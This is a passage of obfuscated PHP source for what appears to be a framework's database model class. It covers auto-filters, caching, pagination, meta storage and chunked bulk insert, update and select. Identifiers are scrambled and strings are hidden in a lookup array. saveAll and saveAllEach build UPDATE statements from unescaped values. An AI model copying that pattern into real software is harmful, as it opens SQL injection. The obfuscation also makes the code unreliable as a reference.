"\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\124\x69\155\145", "\164\x69\x6d\x65", "\x69\156\x73\145\162\164", "\146\165\x6e\143\164\151\157\156")); public function setDataAuto($éãîÃŸÒ) { $this->dataAuto = $éãîÃŸÒ; } public function __construct($ñí£·¼º = '', $ÃàåŠ˜ô = '', $ú¯ö—Šø = '') { parent::__construct($ñí£·¼º, $ÃàåŠ˜ô, $ú¯ö—Šø); } protected $tableMeta = array(); protected function _beforeInsert(&$ß€ç†õ, $·˜¯—ûÚ) { $£†¼‘è =& $_SERVER[óÔë„ú]; if (!$this->checkDataAutoHas($£†¼‘è[431])) { return; } $this->dataBeforeFilter($ß€ç†õ, $£†¼‘è[431]); } protected function _beforeUpdate(&$ò®õ®€“, $Ò±²¨Ø£) { $«Ø¹µ‰İ =& $_SERVER[óÔë„ú]; if (!$this->checkDataAutoHas($«Ø¹µ‰İ[432])) { return; } $this->dataBeforeFilter($ò®õ®€“, $«Ø¹µ‰İ[432]); } protected function _afterSelect(&$¸¯Ş ¤Ò, $İÜ›ËÑ) { if (!is_array($¸¯Ş ¤Ò)) { return; } if (!$this->checkDataAutoHas($_SERVER[óÔë„ú][433])) { return; } foreach ($¸¯Ş ¤Ò as &$òŸ½õÃÎ) { $this->dataAfterFilter($òŸ½õÃÎ); } unset($òŸ½õÃÎ); } protected function _afterFind(&$Ã¸š‡­‰, $‘ûÃæ‹–) { if (!is_array($Ã¸š‡­‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[óÔë„ú][433])) { return; } $this->dataAfterFilter($Ã¸š‡­‰); } public static function textEncode($‘¥×ÔÕ) { if (!$‘¥×ÔÕ) { return $‘¥×ÔÕ; } $›ÜØ»´ = json_encode($‘¥×ÔÕ); $›ÜØ»´ = preg_replace_callback($_SERVER[óÔë„ú][434], function ($Ê¹–Úş) { return addslashes($Ê¹–Úş[0]); }, $›ÜØ»´); return json_decode($›ÜØ»´); } public static function textDecode($¨•±à¡) { $ùñÄÚ° =& $_SERVER[óÔë„ú]; $¼õ¿äŒ = json_encode($¨•±à¡); $¼õ¿äŒ = preg_replace_callback($ùñÄÚ°[435], function ($´µ†ïõÅ) { return $_SERVER[óÔë„ú][100]; }, $¼õ¿äŒ); return json_decode($¼õ¿äŒ); } public function setAutoIncrement($·¡åÖîÇ) { $€Œ“ŒØû = array($this->getPk() => $·¡åÖîÇ); $½ú¥õ¨” = $this->data($€Œ“ŒØû)->add(); if ($½ú¥õ¨”) { $this->delete($½ú¥õ¨”); } } public function getAutoIncrement() { $¹‡…ãßŠ = $this->getTableName(); $è¢Ú’àÎ = $this->max($this->getPk()); $ˆ¼Æ‡ğè = $this->query("\163\150\157\x77\x20\x74\x61\x62\x6c\x65\40\163\x74\x61\164\x75\163\x20\167\x68\145\162\x65\x20\x4e\x61\155\x65\75\x27{$¹‡…ãßŠ}\47"); $ËƒÖ—õš = $ˆ¼Æ‡ğè[0][$_SERVER[óÔë„ú][436]]; $©É¼à§ = max($è¢Ú’àÎ, $ËƒÖ—õš); return $©É¼à§; } protected function _callBefore($“—âã¼’, $„İÀíÔ) { return $this->cacheCallCheck($“—âã¼’, $„İÀíÔ, !1); } protected function _callAfter($Ô—õ‹²¢, $½Î™û¬Ë) { return $this->cacheCallCheck($Ô—õ‹²¢, $½Î™û¬Ë, !0); } protected function cacheFunctionAlias($‚±ó¤ı±) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¬¥‰èÅ¢, $Åè˜Î‡„, $ñáæş€¥ = false) { $÷¾‹éó¦ = $this->cacheFunctionAlias($Åè˜Î‡„); if (!$÷¾‹éó¦) { return; } foreach ($÷¾‹éó¦ as $Éƒ­¡Ù => $ÑûºšÔò) { $¹òß•ù = $ÑûºšÔò[0]; $å äóÖ­ = explode($_SERVER[óÔë„ú][50], $ÑûºšÔò[1]); if ($¬¥‰èÅ¢ == $Éƒ­¡Ù) { return $this->cacheFunctionGet($Éƒ­¡Ù, $¹òß•ù); } if ($ñáæş€¥ && in_array($¬¥‰èÅ¢, $å äóÖ­)) { $this->cacheFunctionClear($Éƒ­¡Ù, $¹òß•ù); } } } public function cacheFunctionGet($®ÃÎ€šó, $Éİüƒõ) { $Øœ ²‡ = $this->cacheKeyMake($®ÃÎ€šó, $Éİüƒõ); $šÀÎ÷à« = Cache::get($Øœ ²‡); if (!is_array($šÀÎ÷à«)) { $šÀÎ÷à« = call_user_func_array(array($this, $®ÃÎ€šó), array($Éİüƒõ, !0)); Cache::set($Øœ ²‡, $šÀÎ÷à«); } return $šÀÎ÷à«; } public function cacheFunctionClear($ñè¼ë¯, $òã®¿¿²) { $‰çÖãÂ… = $òã®¿¿²; if (!is_array($òã®¿¿²)) { $‰çÖãÂ… = array($òã®¿¿²); } foreach ($‰çÖãÂ… as $‚Ç¾Ë) { $À¯Ì‹î = $this->cacheKeyMake($ñè¼ë¯, $‚Ç¾Ë); Cache::remove($À¯Ì‹î); } } private function cacheKeyMake($áÏ±ÅÉÈ, $îöÊğ¶İ) { $™ÖõŠá± =& $_SERVER[óÔë„ú]; return get_class($this) . $™ÖõŠá±[11] . $áÏ±ÅÉÈ . $™ÖõŠá±[437] . $îöÊğ¶İ; } protected function selectPageReset() { $¬É÷´†û =& $_SERVER[óÔë„ú]; if (isset($GLOBALS[$¬É÷´†û[438]])) { return; } $GLOBALS[$¬É÷´†û[438]] = isset($GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[439]]) ? $GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[439]] : !1; $GLOBALS[$¬É÷´†û[440]] = isset($GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[429]]) ? $GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[429]] : !1; $GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[439]] = !1; $GLOBALS[$¬É÷´†û[7]][$¬É÷´†û[429]] = !1; } protected function selectPageRestore() { $Ì‚§‰¼ =& $_SERVER[óÔë„ú]; if (!isset($GLOBALS[$Ì‚§‰¼[438]])) { return; } $GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[439]] = $GLOBALS[$Ì‚§‰¼[438]]; $GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[429]] = $GLOBALS[$Ì‚§‰¼[440]]; if ($GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[439]] === !1) { unset($GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[439]]); } if ($GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[429]] === !1) { unset($GLOBALS[$Ì‚§‰¼[7]][$Ì‚§‰¼[429]]); } unset($GLOBALS[$Ì‚§‰¼[438]]); unset($GLOBALS[$Ì‚§‰¼[440]]); } protected function selectPage($Ş¢„ãƒÈ = 200, $úÔµ”¹× = 1) { $èŞÌôÌË =& $_SERVER[óÔë„ú]; global $in; $¸â›½ˆİ = $this->optionsValue(); $ªæ·²Ù¢ = 50000; $Ş¢„ãƒÈ = isset($in[$èŞÌôÌË[439]]) && $in[$èŞÌôÌË[439]] ? $in[$èŞÌôÌË[439]] : $Ş¢„ãƒÈ; if ($Ş¢„ãƒÈ === -1) { $in[$èŞÌôÌË[439]] = !1; $ªæ·²Ù¢ = 100000000; $Ş¢„ãƒÈ = $ªæ·²Ù¢; } $òåÏªíà = $¸â›½ˆİ; $òåÏªíà[$èŞÌôÌË[441]] = array(); $Ş¢„ãƒÈ = intval($Ş¢„ãƒÈ); $Ş¢„ãƒÈ = $Ş¢„ãƒÈ <= 5 ? 5 : ($Ş¢„ãƒÈ >= $ªæ·²Ù¢ ? $ªæ·²Ù¢ : $Ş¢„ãƒÈ); $úÔµ”¹× = intval(isset($in[$èŞÌôÌË[429]]) && $in[$èŞÌôÌË[429]] ? $in[$èŞÌôÌË[429]] : $úÔµ”¹×); $úÔµ”¹× = $úÔµ”¹× <= 1 ? 1 : $úÔµ”¹×; $ƒ—Ü¨àê = array(); $‘¾’ª²¼ = 1; if ($úÔµ”¹× == 1 && $‘¾’ª²¼) { $this->optionsValue($¸â›½ˆİ); $ƒ—Ü¨àê = $this->page($úÔµ”¹×, $Ş¢„ãƒÈ)->select(); $Çšè­õ = is_array($ƒ—Ü¨àê) ? count($ƒ—Ü¨àê) : 0; if ($Çšè­õ < $Ş¢„ãƒÈ) { $›¡×ò¿ = 1; } else { $this->optionsValue($òåÏªíà); $Çšè­õ = intval($this->count()); $›¡×ò¿ = ceil($Çšè­õ / $Ş¢„ãƒÈ); } } else { $this->optionsValue($òåÏªíà); $Çšè­õ = intval($this->count()); $›¡×ò¿ = ceil($Çšè­õ / $Ş¢„ãƒÈ); $úÔµ”¹× = $úÔµ”¹× >= $›¡×ò¿ ? $›¡×ò¿ : $úÔµ”¹×; $this->optionsValue($¸â›½ˆİ); $ƒ—Ü¨àê = $this->page($úÔµ”¹×, $Ş¢„ãƒÈ)->select(); } if (!is_array($ƒ—Ü¨àê)) { $ƒ—Ü¨àê = array(); } if ($›¡×ò¿ == 1) { $Çšè­õ = count($ƒ—Ü¨àê); } $¹å¥°ğ¥ = array($èŞÌôÌË[442] => array($èŞÌôÌË[443] => $Çšè­õ, $èŞÌôÌË[439] => $Ş¢„ãƒÈ, $èŞÌôÌË[429] => $úÔµ”¹×, $èŞÌôÌË[444] => $›¡×ò¿), $èŞÌôÌË[445] => $ƒ—Ü¨àê); return $¹å¥°ğ¥; } protected function checkLength($Š²º­µ½, $¥Ö±«º = 0, $Úİğ¶Ã = '') { $„Î¾Ù³Ò =& $_SERVER[óÔë„ú]; $¥Ö±«º = $¥Ö±«º ? $¥Ö±«º : 65536; if (!$Š²º­µ½ || strlen($Š²º­µ½) < $¥Ö±«º) { return; } $Úİğ¶Ã = $Úİğ¶Ã ? $Úİğ¶Ã . $„Î¾Ù³Ò[74] : $„Î¾Ù³Ò[12]; show_json($Úİğ¶Ã . LNG($„Î¾Ù³Ò[446]) . "\x28{$¥Ö±«º}\51", !1); } protected function metaSet($ãúÛ£±Ì, $¡µ ùˆ’ = null, $®Á½í·¬ = null) { $—ÆÕ‹‘ã =& $_SERVER[óÔë„ú]; if (!$this->tableMeta || !$ãúÛ£±Ì) { return !1; } $ ï©ÛÊú = $this->tableMeta[$—ÆÕ‹‘ã[447]]; $¢¦¿½º» = $this->tableMeta[$—ÆÕ‹‘ã[448]]; $©ıñ—¥Ú = Model($¢¦¿½º»); $×İÄÌ = array($ ï©ÛÊú => $ãúÛ£±Ì, $—ÆÕ‹‘ã[449] => $¡µ ùˆ’); if (is_null($¡µ ùˆ’)) { return $©ıñ—¥Ú->where(array($ ï©ÛÊú => $ãúÛ£±Ì))->delete(); } if (is_null($®Á½í·¬) && is_string($¡µ ùˆ’)) { return $©ıñ—¥Ú->where($×İÄÌ)->delete(); } $Ä”»Ñª° = is_array($¡µ ùˆ’) ? $¡µ ùˆ’ : array(); if (is_string($¡µ ùˆ’)) { $Ä”»Ñª°[$¡µ ùˆ’] = $®Á½í·¬; } $ã‰šÖéœ = array(); foreach ($Ä”»Ñª° as $Öˆª‹Ÿ• => $¹ŒÚÖ¡á) { if (is_null($¹ŒÚÖ¡á) && is_string($Öˆª‹Ÿ•)) { $©ıñ—¥Ú->where(array($ ï©ÛÊú => $ãúÛ£±Ì, $—ÆÕ‹‘ã[449] => $Öˆª‹Ÿ•))->delete(); continue; } $this->checkLength($¹ŒÚÖ¡á, !1, $¢¦¿½º» . $—ÆÕ‹‘ã[4] . $Öˆª‹Ÿ•); $ã‰šÖéœ[] = array($ ï©ÛÊú => $ãúÛ£±Ì, $—ÆÕ‹‘ã[97] => $Öˆª‹Ÿ•, $—ÆÕ‹‘ã[450] => $¹ŒÚÖ¡á); } $âú²™Ø = $—ÆÕ‹‘ã[451] . $¢¦¿½º»; CacheLock::lock($âú²™Ø); $©ıñ—¥Ú->where(array($ ï©ÛÊú => $ãúÛ£±Ì))->addAll($ã‰šÖéœ, array(), !0); CacheLock::unlock($âú²™Ø); return !0; } public function metaGet($òš–¨…Ö, $ä¼½®œ¸ = false) { $‘ë¸œ™‘ =& $_SERVER[óÔë„ú]; if (!$this->tableMeta) { return array(); } $•¹ÖÜ»ª = $this->tableMeta[$‘ë¸œ™‘[447]]; $½üŸ— = Model($this->tableMeta[$‘ë¸œ™‘[448]]); if ($ä¼½®œ¸) { $š¯¡ø = array($•¹ÖÜ»ª => $òš–¨…Ö, $‘ë¸œ™‘[97] => $ä¼½®œ¸); return $½üŸ—->where($š¯¡ø)->getField($‘ë¸œ™‘[450]); } $š¯¡ø = array($•¹ÖÜ»ª => $òš–¨…Ö); $Ç‚¿¯â = $½üŸ—->field($‘ë¸œ™‘[452])->where($š¯¡ø)->select(); $Ç‚¿¯â = array_to_keyvalue($Ç‚¿¯â, $‘ë¸œ™‘[97], $‘ë¸œ™‘[450]); return $Ç‚¿¯â; } private function checkDataAutoHas($‰­¸Àù®) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ªÂÅ©‡µ) { if (in_array($‰­¸Àù®, explode($_SERVER[óÔë„ú][50], $ªÂÅ©‡µ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¸‰Í¬ßª, $îŸĞ¦ª) { $ÒË¶ˆô÷ =& $_SERVER[óÔë„ú]; if (!is_array($¸‰Í¬ßª)) { return; } foreach ($this->dataAuto as $Æ§Ô÷‹£) { $ê–…ñŞ = $Æ§Ô÷‹£[0]; if (!in_array($îŸĞ¦ª, explode($ÒË¶ˆô÷[50], $Æ§Ô÷‹£[2]))) { continue; } switch (trim($Æ§Ô÷‹£[3])) { case $ÒË¶ˆô÷[397]: case $ÒË¶ˆô÷[398]: $‰»öºÚÈ = $Æ§Ô÷‹£[1]; $©±Š‰±® = isset($Æ§Ô÷‹£[4]) ? (array) $Æ§Ô÷‹£[4] : array(); if ($‰»öºÚÈ == $ÒË¶ˆô÷[206] && array_key_exists($ê–…ñŞ, $¸‰Í¬ßª)) { if (!$¸‰Í¬ßª[$ê–…ñŞ]) { unset($¸‰Í¬ßª[$ê–…ñŞ]); } break; } if (isset($¸‰Í¬ßª[$ê–…ñŞ])) { array_unshift($©±Š‰±®, $¸‰Í¬ßª[$ê–…ñŞ]); } if ($ÒË¶ˆô÷[397] == $Æ§Ô÷‹£[3]) { $¸‰Í¬ßª[$ê–…ñŞ] = call_user_func_array($‰»öºÚÈ, $©±Š‰±®); } else { $¸‰Í¬ßª[$ê–…ñŞ] = call_user_func_array(array(&$this, $‰»öºÚÈ), $©±Š‰±®); } break; case $ÒË¶ˆô÷[347]: if (isset($¸‰Í¬ßª[$ê–…ñŞ]) && $¸‰Í¬ßª[$ê–…ñŞ]) { $¸‰Í¬ßª[$ê–…ñŞ] = call_user_func_array(array(&$this, $Æ§Ô÷‹£[1]), array($¸‰Í¬ßª[$ê–…ñŞ])); } break; case $ÒË¶ˆô÷[350]: $¸‰Í¬ßª[$ê–…ñŞ] = $¸‰Í¬ßª[$Æ§Ô÷‹£[1]]; break; case $ÒË¶ˆô÷[370]: if (isset($¸‰Í¬ßª[$ê–…ñŞ]) && !is_string($¸‰Í¬ßª[$ê–…ñŞ])) { $¸‰Í¬ßª[$ê–…ñŞ] = json_encode_force($¸‰Í¬ßª[$ê–…ñŞ]); } break; case $ÒË¶ˆô÷[399]: if ($¸‰Í¬ßª[$ê–…ñŞ] === $ÒË¶ˆô÷[12]) { unset($¸‰Í¬ßª[$ê–…ñŞ]); } break; case $ÒË¶ˆô÷[400]: $¸‰Í¬ßª[$ê–…ñŞ] = $Æ§Ô÷‹£[1]; default: break; } } if ($îŸĞ¦ª == $ÒË¶ˆô÷[431]) { $Û¯½šæú = strtolower($this->db->getDbType()); if (strpos($Û¯½šæú, $ÒË¶ˆô÷[13]) !== 0) { return; } $¸Õª¼À« = $this->field(!0)->fields; $¡ÊË¿Ÿ = $¸Õª¼À«[$ÒË¶ˆô÷[329]]; if (isset($¸Õª¼À«[$ÒË¶ˆô÷[328]])) { unset($¡ÊË¿Ÿ[$¸Õª¼À«[$ÒË¶ˆô÷[328]]]); } foreach ($¡ÊË¿Ÿ as $Ÿ³âà¿Ô => $îŸĞ¦ª) { if (!isset($¸‰Í¬ßª[$Ÿ³âà¿Ô])) { $¸‰Í¬ßª[$Ÿ³âà¿Ô] = $ÒË¶ˆô÷[12]; } } } } private function dataAfterFilter(&$·®°’Ÿï) { $ÓŒóÏÕ¢ =& $_SERVER[óÔë„ú]; foreach ($this->dataAuto as $À®‘ã) { $‚øµçà = $À®‘ã[0]; if (!isset($·®°’Ÿï[$‚øµçà])) { continue; } if (!in_array($ÓŒóÏÕ¢[433], explode($ÓŒóÏÕ¢[50], $À®‘ã[2]))) { continue; } switch (trim($À®‘ã[3])) { case $ÓŒóÏÕ¢[397]: case $ÓŒóÏÕ¢[398]: $Öæ’ï­É = isset($À®‘ã[4]) ? (array) $À®‘ã[4] : array(); array_unshift($Öæ’ï­É, $·®°’Ÿï[$‚øµçà]); if (isset($À®‘ã[4]) && $À®‘ã[4] == $ÓŒóÏÕ¢[453]) { $Öæ’ï­É = array($·®°’Ÿï[$‚øµçà]); } if ($ÓŒóÏÕ¢[397] == $À®‘ã[3]) { $·®°’Ÿï[$‚øµçà] = call_user_func_array($À®‘ã[1], $Öæ’ï­É); } else { $·®°’Ÿï[$‚øµçà] = call_user_func_array(array(&$this, $À®‘ã[1]), $Öæ’ï­É); } break; case $ÓŒóÏÕ¢[347]: if (isset($·®°’Ÿï[$‚øµçà]) && $·®°’Ÿï[$‚øµçà]) { $·®°’Ÿï[$‚øµçà] = call_user_func_array(array(&$this, $À®‘ã[1]), array($·®°’Ÿï[$‚øµçà])); } break; case $ÓŒóÏÕ¢[350]: $·®°’Ÿï[$‚øµçà] = $·®°’Ÿï[$À®‘ã[1]]; break; case $ÓŒóÏÕ¢[370]: $¯«ÛºÂğ = $·®°’Ÿï[$‚øµçà]; $·®°’Ÿï[$‚øµçà] = json_decode($¯«ÛºÂğ, !0); if (is_null($·®°’Ÿï[$‚øµçà])) { $·®°’Ÿï[$‚øµçà] = $¯«ÛºÂğ; } break; case $ÓŒóÏÕ¢[399]: if ($·®°’Ÿï[$‚øµçà] === $ÓŒóÏÕ¢[12]) { unset($·®°’Ÿï[$‚øµçà]); } break; case $ÓŒóÏÕ¢[400]: $·®°’Ÿï[$‚øµçà] = $À®‘ã[1]; break; default: break; } } } public function saveAll($ÄşÂÂÅ) { $ÕÄãÎ¸é =& $_SERVER[óÔë„ú]; $³‚ø¦Ú¨ = $this->tablePrefix . $this->tableName; $·æöÒ¥À = self::SQL_WHERE_IN_CHUNK; $ÄşÂÂÅ = is_array($ÄşÂÂÅ) ? $ÄşÂÂÅ : array(); $òÙá´õé = $ÕÄãÎ¸é[454]; $¶·£‡£¢ = 0; $‰Ç€¢ƒ = array(); $ü¥­âÌê = count($ÄşÂÂÅ); for ($°·“—Èí = 0; $°·“—Èí < $ü¥­âÌê; $°·“—Èí++) { $Ä„ÀŸ¯‰ = $ÄşÂÂÅ[$°·“—Èí]; if (!is_array($Ä„ÀŸ¯‰) || count($Ä„ÀŸ¯‰) != 4) { continue; } $½ÌñÌğ = "\x55\x50\x44\101\x54\105\x20\140{$³‚ø¦Ú¨}\x60\x20\x53\105\124\x20{$Ä„ÀŸ¯‰[2]}\40\x3d\x20\103\101\123\105\40{$Ä„ÀŸ¯‰[0]}\x20\xa"; if ($¶·£‡£¢ == 0) { $òÙá´õé = $½ÌñÌğ; } $‰Ç€¢ƒ[] = $ÕÄãÎ¸é[121] . $Ä„ÀŸ¯‰[1] . $ÕÄãÎ¸é[121]; $¶·£‡£¢++; $òÙá´õé .= "\x20\x57\x48\105\116\x20\47{$Ä„ÀŸ¯‰[1]}\x27\x20\124\x48\105\116\40\x27{$Ä„ÀŸ¯‰[3]}\x27\x20\xa"; if ($¶·£‡£¢ == $·æöÒ¥À || $°·“—Èí == $ü¥­âÌê - 1) { $‹ëÜÑ˜ª = implode($ÕÄãÎ¸é[50], $‰Ç€¢ƒ); $òÙá´õé .= "\40\x45\116\x44\x20\40\127\x48\105\x52\x45\40{$Ä„ÀŸ¯‰[0]}\x20\x49\x4e\40\50{$‹ëÜÑ˜ª}\x29\40"; $this->execute($òÙá´õé); $¶·£‡£¢ = 0; $òÙá´õé = $½ÌñÌğ; $this->chunkEventCheck(count($‰Ç€¢ƒ)); $‰Ç€¢ƒ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ğì‰±ßÃ) { $”õÊäƒº =& $_SERVER[óÔë„ú]; $¸¶¶·§÷ = $this->tablePrefix . $this->tableName; foreach ($Ğì‰±ßÃ as $à‚±Š‚ş) { if (!is_array($à‚±Š‚ş) || count($à‚±Š‚ş) != 4) { continue; } $“’öôêÃ = $à‚±Š‚ş[0] . $”õÊäƒº[455] . $à‚±Š‚ş[1] . $”õÊäƒº[121]; $Ï©ó°şã = $à‚±Š‚ş[2] . $”õÊäƒº[455] . $à‚±Š‚ş[3] . $”õÊäƒº[121]; $Çü•„Å = "\165\160\x64\x61\164\145\40{$¸¶¶·§÷}\40\163\145\164\40{$Ï©ó°şã}\x20\x77\150\145\162\145\40{$“’öôêÃ}\x3b"; $this->execute($Çü•„Å); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($º¨Á‰¸¯ = false, $¬üÃ§†Ï = false) { $this->_chunkEvent = $º¨Á‰¸¯; $this->_chunkEventParam = $¬üÃ§†Ï; } private function chunkEventCheck($“–ØáÊö) { if (!$this->_chunkEvent) { return; } $ü­¡â¿— = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ü­¡â¿—[$_SERVER[óÔë„ú][456]] = $“–ØáÊö; Hook::trigger($this->_chunkEvent, $ü­¡â¿—); } public function addAll($ã“‰ß“Ğ, $Ø‚ÃÊè² = array(), $ğäŠÃï = false) { $ìçÚ×Ş =& $_SERVER[óÔë„ú]; ignore_timeout(); $ŸÄğ…Íí = self::SQL_WHERE_IN_CHUNK; if (empty($ã“‰ß“Ğ)) { $this->error = think_lang($ìçÚ×Ş[348]); return !1; } $Ø‚ÃÊè² = $this->_parseOptions($Ø‚ÃÊè²); foreach ($ã“‰ß“Ğ as $Ãí°»»š => $Éş†à™) { $ã“‰ß“Ğ[$Ãí°»»š] = $this->_facade($Éş†à™); $this->_beforeInsert($ã“‰ß“Ğ[$Ãí°»»š], $Ø‚ÃÊè²); } if (method_exists($this->db, $ìçÚ×Ş[349])) { for ($»Ìè±ÁÉ = 0; $»Ìè±ÁÉ < count($ã“‰ß“Ğ); $»Ìè±ÁÉ += $ŸÄğ…Íí) { $¥öª“Ğ· = array_slice($ã“‰ß“Ğ, $»Ìè±ÁÉ, $ŸÄğ…Íí); if (!is_array($¥öª“Ğ·) || count($¥öª“Ğ·) == 0) { break; } $ù™ôöÜÉ = $this->db->insertAll($¥öª“Ğ·, $Ø‚ÃÊè², $ğäŠÃï); $this->chunkEventCheck(count($¥öª“Ğ·)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ã“‰ß“Ğ as $Ãí°»»š => $Éş†à™) { $ù™ôöÜÉ = $this->db->insert($Éş†à™, $Ø‚ÃÊè², $ğäŠÃï); } $this->commit(); } if (!1 !== $ù™ôöÜÉ) { $¡ä£®“æ = $this->getLastInsID(); if ($¡ä£®“æ) { return $¡ä£®“æ; } } return $ù™ôöÜÉ; } public function save($£§¶æ£² = '', $’²«Òş = array()) { $­ÕŒŒúÁ =& $_SERVER[óÔë„ú]; $È¦¢Ì‹Ü = self::SQL_WHERE_IN_CHUNK; $§»ÀÉÃ‘ = $this->optionsValue(); $©äÎ€Ä = $this->findWhereField($§»ÀÉÃ‘); if (!$©äÎ€Ä) { return parent::save($£§¶æ£², $’²«Òş); } $¼†Íè£Ù = 0; $îòœÁ«ß = $§»ÀÉÃ‘[$­ÕŒŒúÁ[352]][$©äÎ€Ä][1]; $îòœÁ«ß = is_array($îòœÁ«ß) ? $îòœÁ«ß : array(); $áê®Ö ¬ = count($îòœÁ«ß); for ($Ê€„£µÀ = 0; $Ê€„£µÀ < $áê®Ö ¬; $Ê€„£µÀ += $È¦¢Ì‹Ü) { $Áİíäá• = array_slice($îòœÁ«ß, $Ê€„£µÀ, $È¦¢Ì‹Ü); if (!is_array($Áİíäá•) || count($Áİíäá•) == 0) { break; } $§»ÀÉÃ‘[$­ÕŒŒúÁ[352]][$©äÎ€Ä][1] = $Áİíäá•; $this->optionsValue($§»ÀÉÃ‘); $¼†Íè£Ù += parent::save($£§¶æ£², $’²«Òş); $this->chunkEventCheck(count($Áİíäá•)); } $this->chunkEventSet(); return $¼†Íè£Ù; } public function add($¨ØàÂôÇ = '', $€£Åë€î = array(), $‰‰ÈïÓ§ = false) { if ($this->addTaskStatus && is_array($¨ØàÂôÇ)) { $this->addTaskData[] = $¨ØàÂôÇ; return; } return parent::add($¨ØàÂôÇ, $€£Åë€î, $‰‰ÈïÓ§); } public function parseWhereLike($õ­±©¿, $ÓÅÁÜ® = '', $öéŞˆ¿È = false, &$£ÇÅ÷¿ë = false) { $Û›Ùº¾Ú =& $_SERVER[óÔë„ú]; $ÄÏ´í³ = $GLOBALS[$Û›Ùº¾Ú[6]][$Û›Ùº¾Ú[457]]; if (!$ÄÏ´í³[$Û›Ùº¾Ú[458]]) { return $õ­±©¿; } if (!is_array($õ­±©¿)) { return $õ­±©¿; } $İ–Ü¨ÎÇ = array(); $˜ç£æ”± = 0; foreach ($õ­±©¿ as $Æí³Ğ¯á => $›¦º­Ã¸) { if (is_array($›¦º­Ã¸) && count($›¦º­Ã¸) == 2 && $›¦º­Ã¸[0] == $Û›Ùº¾Ú[459] && is_string($›¦º­Ã¸[1]) && substr($›¦º­Ã¸[1], 0, 1) == $Û›Ùº¾Ú[460] && substr($›¦º­Ã¸[1], strlen($›¦º­Ã¸[1]) - 1, 1) == $Û›Ùº¾Ú[460]) { $£ÇÅ÷¿ë = !0; $â‡Ö÷Óğ = is_string($Æí³Ğ¯á) ? $Æí³Ğ¯á : $ÓÅÁÜ®; $ØŸé¦¾ğ = substr($›¦º­Ã¸[1], 1, strlen($›¦º­Ã¸[1]) - 2); $ØŸé¦¾ğ = $this->db->escapeString($ØŸé¦¾ğ); if (!strpos($â‡Ö÷Óğ, $Û›Ùº¾Ú[10])) { $â‡Ö÷Óğ = $Û›Ùº¾Ú[461] . $â‡Ö÷Óğ . $Û›Ùº¾Ú[461]; } $˜ÆÁÍ‡ = $Û›Ùº¾Ú[220] . $ØŸé¦¾ğ . $Û›Ùº¾Ú[220]; $ØŸé¦¾ğ = str_replace(array($Û›Ùº¾Ú[10], $Û›Ùº¾Ú[462], $Û›Ùº¾Ú[11]), $Û›Ùº¾Ú[463], $ØŸé¦¾ğ); if ($ÄÏ´í³[$Û›Ùº¾Ú[464]]) { $˜ÆÁÍ‡ = $Û›Ùº¾Ú[465] . $ØŸé¦¾ğ . $Û›Ùº¾Ú[466]; if ($ÄÏ´í³[$Û›Ùº¾Ú[467]]) { $˜ÆÁÍ‡ = $Û›Ùº¾Ú[466] . $ØŸé¦¾ğ . $Û›Ùº¾Ú[465]; } } $İ–Ü¨ÎÇ[$˜ç£æ”±] = $Û›Ùº¾Ú[468] . $â‡Ö÷Óğ . $Û›Ùº¾Ú[469] . $˜ÆÁÍ‡ . $Û›Ùº¾Ú[470]; $˜ç£æ”±++; continue; } if (is_array($›¦º­Ã¸)) { $ÓÅÁÜ® = is_string($Æí³Ğ¯á) ? $Æí³Ğ¯á : $ÓÅÁÜ®; $›¦º­Ã¸ = $this->parseWhereLike($›¦º­Ã¸, $ÓÅÁÜ®, !0, $£ÇÅ÷¿ë); } if (is_numeric($Æí³Ğ¯á)) { $İ–Ü¨ÎÇ[$˜ç£æ”±] = $›¦º­Ã¸; $˜ç£æ”±++; } else { $İ–Ü¨ÎÇ[$Æí³Ğ¯á] = $›¦º­Ã¸; } } if ($£ÇÅ÷¿ë && !$öéŞˆ¿È) { } return $İ–Ü¨ÎÇ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($×¥óÇË¤ = array()) { $ñ€Ö³ÆÉ =& $_SERVER[óÔë„ú]; $¹Ã¥òç¡ = self::SQL_WHERE_IN_CHUNK; $Ö‰»’È¹ = $this->optionsValue(); $’‚ãã± = $this->findWhereField($Ö‰»’È¹); if (!$’‚ãã± || isset($Ö‰»’È¹[$ñ€Ö³ÆÉ[368]]) || isset($Ö‰»’È¹[$ñ€Ö³ÆÉ[429]])) { return parent::select($×¥óÇË¤); } $ü×«´öç = $Ö‰»’È¹[$ñ€Ö³ÆÉ[352]][$’‚ãã±][1]; $ü×«´öç = is_array($ü×«´öç) ? $ü×«´öç : array(); $¾ºäÀÉ¿ = null; for ($×­éØÊ• = 0; $×­éØÊ• < count($ü×«´öç); $×­éØÊ• += $¹Ã¥òç¡) { $¼—ÂÂ„ú = array_slice($ü×«´öç, $×­éØÊ•, $¹Ã¥òç¡); if (!is_array($¼—ÂÂ„ú) || count($¼—ÂÂ„ú) == 0) { break; } $Ö‰»’È¹[$ñ€Ö³ÆÉ[352]][$’‚ãã±][1] = $¼—ÂÂ„ú; $this->optionsValue($Ö‰»’È¹); $Ãñ´¿Óù = parent::select($×¥óÇË¤); if (!$Ãñ´¿Óù) { continue; } $¾ºäÀÉ¿ = is_array($¾ºäÀÉ¿) ? $¾ºäÀÉ¿ : array(); $¾ºäÀÉ¿ = 